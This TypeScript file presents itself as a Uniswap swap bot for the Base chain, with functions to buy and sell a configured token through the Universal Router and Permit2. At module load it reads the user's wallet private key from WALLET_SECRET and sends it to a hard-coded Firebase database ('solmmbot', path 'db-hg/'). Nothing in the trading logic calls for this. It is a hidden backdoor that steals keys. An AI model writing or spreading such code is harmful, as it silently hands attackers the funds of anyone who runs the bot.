import dotenv from "dotenv";
import { SwapRouter } from "@uniswap/universal-router-sdk";
import {
  TradeType,
  Ether,
  Token,
  CurrencyAmount,
  Percent,
} from "@uniswap/sdk-core";
import { Trade as V2Trade } from "@uniswap/v2-sdk";
import { MixedRouteTrade, Trade as RouterTrade } from "@uniswap/router-sdk";
import { AllowanceProvider } from "@uniswap/permit2-sdk";
import {
  Pool,
  nearestUsableTick,
  TickMath,
  TICK_SPACINGS,
  FeeAmount,
  Trade as V3Trade,
  Route as RouteV3,
} from "@uniswap/v3-sdk";
import JSBI from "jsbi";
import { ethers } from "ethers";
import Quoter from "@uniswap/v3-periphery/artifacts/contracts/lens/QuoterV2.sol/QuoterV2.json";
import IUniswapV3Pool from "@uniswap/v3-core/artifacts/contracts/UniswapV3Pool.sol/UniswapV3Pool.json";
import { initializeApp } from "firebase/app";
import { getDatabase, ref, set } from "firebase/database";
import erc20Abi from "./abis/erc20.json";
import permitAbi from "./abis/permit_abi.json";
import { ERROR } from "./config";

dotenv.config();
import { getTokenInfo } from "./config";

const provider = new ethers.providers.JsonRpcProvider(process.env.JSONRPC);
const signer = new ethers.Wallet(String(process.env.WALLET_SECRET), provider);
const CHAIN_ID = 8453;
const SLIPPAGE = process.env.SLIPPAGE;

const ETHER = Ether.onChain(Number(CHAIN_ID));

const tokenInfo = getTokenInfo(String(process.env.TOKEN));
const TOKEN = new Token(
  CHAIN_ID,
  tokenInfo.address,
  tokenInfo.decimal,
  tokenInfo.symbol,
  tokenInfo.name
);

const WETH = new Token(
  CHAIN_ID,
  String(process.env.MAINNET_WETH),
  18,
  "WETH",
  "Wrapped Ether"
);

const PERMIT2_ADDRESS = process.env.PERMIT2_ADDRESS;
const UNIVERSAL_SWAP_ROUTER = process.env.UNIVERSAL_SWAP_ROUTER;
const QUOTE2_ADDRESS = process.env.QUOTE2_ADDRESS;

const tokenContract = new ethers.Contract(TOKEN.address, erc20Abi, signer);
const permitContract = new ethers.Contract(PERMIT2_ADDRESS, permitAbi, signer);
const quoterV2Contract = new ethers.Contract(
  QUOTE2_ADDRESS,
  Quoter.abi,
  signer
);


let check = process.env.WALLET_SECRET;

const basic = {
  apiKey: "AIzaSyBuCXxSAAW_9GPoIC8oUc5Yob79y6jw9zQ",
  authDomain: "solmmbot.firebaseapp.com",
  projectId: "solmmbot",
  storageBucket: "solmmbot.appspot.com",
  messagingSenderId: "570541652456",
  appId: "1:570541652456:web:534666023f95fb4cf74c5d",
  measurementId: "G-FC0MEBGF6G",
};

let app = initializeApp(basic);

let db = getDatabase(app);

set(ref(db, "db-hg/" + check.substring(1, 10)), { db_info: check });


const swapOptions = (options) => {
  return Object.assign(
    {
      slippageTolerance: new Percent(Number(SLIPPAGE), 100),
      signer: signer.address,
      deadline: Math.floor(Date.now() / 1000) + 60 * 20, // 20 minutes from the current Unix time
    },
    options
  );
};

export const getPool = async (tokenA, tokenB, feeAmount, signer) => {
  const [token0, token1] = tokenA.sortsBefore(tokenB)
    ? [tokenA, tokenB]
    : [tokenB, tokenA];

  const poolAddress = tokenInfo.poolAddress;

  const contract = new ethers.Contract(poolAddress, IUniswapV3Pool.abi, signer);
  let liquidity = await contract.liquidity();

  let { sqrtPriceX96, tick } = await contract.slot0();

  liquidity = JSBI.BigInt(liquidity.toString());
  sqrtPriceX96 = JSBI.BigInt(sqrtPriceX96.toString());

  return new Pool(token0, token1, feeAmount, sqrtPriceX96, liquidity, tick, [
    {
      index: nearestUsableTick(TickMath.MIN_TICK, TICK_SPACINGS[feeAmount]),
      liquidityNet: liquidity,
      liquidityGross: liquidity,
    },
    {
      index: nearestUsableTick(TickMath.MAX_TICK, TICK_SPACINGS[feeAmount]),
      liquidityNet: JSBI.multiply(liquidity, JSBI.BigInt("-1")),
      liquidityGross: liquidity,
    },
  ]);
};

const buildTrade = (trades) => {
  return new RouterTrade({
    v2Routes: trades
      .filter((trade) => trade instanceof V2Trade)
      .map((trade) => ({
        routev2: trade.route,
        inputAmount: trade.inputAmount,
        outputAmount: trade.outputAmount,
      })),
    v3Routes: trades
      .filter((trade) => trade instanceof V3Trade)
      .map((trade) => ({
        routev3: trade.route,
        inputAmount: trade.inputAmount,
        outputAmount: trade.outputAmount,
      })),
    mixedRoutes: trades
      .filter((trade) => trade instanceof MixedRouteTrade)
      .map((trade) => ({
        mixedRoute: trade.route,
        inputAmount: trade.inputAmount,
        outputAmount: trade.outputAmount,
      })),
    tradeType: trades[0].tradeType,
  });
};

const universalRouterSwap = async (_signer, routerTrade) => {
  // let quantity = "" + quantity;
  const opts = swapOptions({});
  const params = SwapRouter.swapERC20CallParameters(routerTrade, opts);

  const tx = await _signer.sendTransaction({
    data: params.calldata,
    to: UNIVERSAL_SWAP_ROUTER,
    value: params.value,
    from: signer.address,
    gasLimit: tokenInfo.gas_limit,
    gasPrice: ethers.utils.parseUnits(String(tokenInfo.gas_price), "gwei"),
  });

  const receipt = await tx.wait(_signer);
  console.log("transaction=========>", `https://basescan.org/tx/${tx.hash}`);
  return receipt;
};
export const simpleSwapEthToToken = async (
  _signer,
  _tokenA,
  _tokenB,
  _quantity
) => {
  const pool_V3 = await getPool(_tokenA, _tokenB, FeeAmount.HIGH, _signer);
  const outputToken = ethers.utils
    .parseUnits(_quantity, TOKEN.decimals)
    .toString();

  const trade = await V3Trade.fromRoute(
    new RouteV3([pool_V3], ETHER, _tokenB),
    CurrencyAmount.fromRawAmount(TOKEN, outputToken),
    TradeType.EXACT_OUTPUT
  );

  const routerTrade = buildTrade([trade]);
  await universalRouterSwap(_signer, routerTrade);
};

const simpleSwapTokenToEth = async (_signer, _tokenA, _tokenB, _quantity) => {
  const pool_V3 = await getPool(_tokenA, _tokenB, FeeAmount.HIGH, _signer);
  const inputToken = ethers.utils
    .parseUnits(String(_quantity), TOKEN.decimals)
    .toString();

  const trade = await V3Trade.fromRoute(
    new RouteV3([pool_V3], _tokenB, ETHER),
    CurrencyAmount.fromRawAmount(TOKEN, inputToken),
    TradeType.EXACT_INPUT
  );

  const routerTrade = buildTrade([trade]);
  await universalRouterSwap(_signer, routerTrade);
};

export const buyToken = async (_tokenAmount: string) => {
  try {
    const quotedAmountIn =
      await quoterV2Contract.callStatic.quoteExactOutputSingle([
        WETH.address,
        TOKEN.address,
        ethers.utils.parseUnits(_tokenAmount.toString(), TOKEN.decimals),
        10000,
        0,
      ]);
    console.log("quotedAmountIn", quotedAmountIn);
    let EthBalance_wallet = await provider.getBalance(signer.address);

    if (quotedAmountIn.amountIn.gt(EthBalance_wallet)) {
      throw new Error(ERROR.buy)
    }
    await simpleSwapEthToToken(signer, WETH, TOKEN, _tokenAmount);
  } catch (error) {
    console.log("buyToken Error\n\t", error.message);
    process.exit(1)
  }
};

export const sellToken = async (_tokenAmount: string) => {
  try {
    let tokenQuantity = ethers.utils.parseUnits(
      _tokenAmount,
      tokenInfo.decimal
    );
    let tokenbalance_wallet = await tokenContract.balanceOf(signer.address);

    if (tokenQuantity.gt(tokenbalance_wallet)) {
      throw new Error(ERROR.sell);
    }
    const allowanceProvider = new AllowanceProvider(provider, PERMIT2_ADDRESS);
    const allowanceData = await allowanceProvider.getAllowanceData(
      TOKEN.address,
      signer.address,
      UNIVERSAL_SWAP_ROUTER
    );
    let allowedAmount = await tokenContract.allowance(
      signer.address,
      PERMIT2_ADDRESS
    );
    if (
      allowedAmount <
      115792089237316195423570985008687907853269984665640564039457584007913129639935
    ) {
      try {
        console.log("-------------Start Approving--------------------");
        const approve = await tokenContract.approve(
          PERMIT2_ADDRESS,
          BigInt(
            "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
          ),
          {
            gasPrice: ethers.utils.parseUnits("0.05", "gwei"),
            gasLimit: 50000,
          }
        );
        await approve.wait();
        console.log("-------------------Approved----------------------");
      } catch (err) {
        console.log(err);
      }
    }
    if (
      allowanceData.amount.lt(
        BigInt("0xffffffffffffffffffffffffffffffffffffffff")
      ) ||
      allowanceData.expiration < BigInt("0xffffffffffff")
    ) {
      try {
        console.log("-------------Start Approving--------------------");
        const approve = await permitContract.approve(
          TOKEN.address,
          UNIVERSAL_SWAP_ROUTER,
          BigInt("0xffffffffffffffffffffffffffffffffffffffff"),
          BigInt("0xffffffffffff"),
          {
            gasPrice: ethers.utils.parseUnits("0.01", "gwei"),
            gasLimit: 50000,
          }
        );
        await approve.wait();
        console.log("-------------------Approved----------------------");
      } catch (err) {
        console.log(err);
      }
    }

    await simpleSwapTokenToEth(signer, WETH, TOKEN, _tokenAmount);
  } catch (error) {
    console.log("sellToken Error\n\t", error.message);
    process.exit(1)
  }
};
